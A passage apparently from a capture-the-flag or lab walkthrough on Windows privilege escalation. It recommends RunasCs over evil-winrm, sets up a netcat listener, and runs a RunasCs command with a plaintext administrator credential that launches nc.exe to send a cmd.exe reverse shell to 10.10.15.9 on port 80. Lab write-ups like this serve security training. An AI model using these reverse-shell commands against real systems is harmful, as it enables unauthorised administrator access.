
Either we login via the new changed password of administrator via evilwinrm or we use RunasCs.exe tool. I like to use the [RunasCs.exe](https://github.com/antonioCoco/RunasCs) tool.

Setup a listener on port 80 as observed. Run the below the RunasCs.exe tool using the new administrator changed password and get a shell as administrator on port 80.

So, just use RunasCs.exe from GitHub, it works great in addition to a built-in reverse shell with -r.

```
rlwrap nc -lvnp 80
```

```
Runas.exe C.Bum Tikkycoll_431012284 "C:\Temp\nc.exe 10.10.15.9 80 -e cmd.exe"
```